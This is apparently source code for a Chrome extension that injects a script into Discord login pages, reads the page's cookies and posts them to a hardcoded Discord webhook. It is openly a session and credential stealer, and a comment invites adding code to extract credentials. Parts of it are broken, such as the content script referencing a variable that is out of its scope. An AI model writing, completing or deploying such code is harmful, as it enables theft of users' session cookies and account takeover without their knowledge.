chrome.webNavigation.onCompleted.addListener(
  function (details) {
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      if (details.url.includes("discord.com/login")) {
        chrome.tabs.executeScript(
          tabs[0].id,
          {
            file: "content.js",
          },
          function () {
            console.log("Injected content script.");
          }
        );
      }
    });
  },
  { url: [{ hostContains: "discord.com" }] }
);

// content.js
// (Incomplete content script, implement code to extract credentials or cookies)
chrome.runtime.sendMessage({ cookies: document.cookie, url: details.url });

// background.js
chrome.runtime.onMessage.addListener(
  function (request) {
    if (request.cookies && request.url) {
      const message = JSON.stringify({
        content: request.cookies,
        url: request.url,
      });

      const webhookUrl = 'https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4';

      fetch(webhookUrl, {
        method: 'POST',
        body: message,
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(res => console.log('Success!'))
      .catch(err => console.error('Error:', err));
    }
  }
);
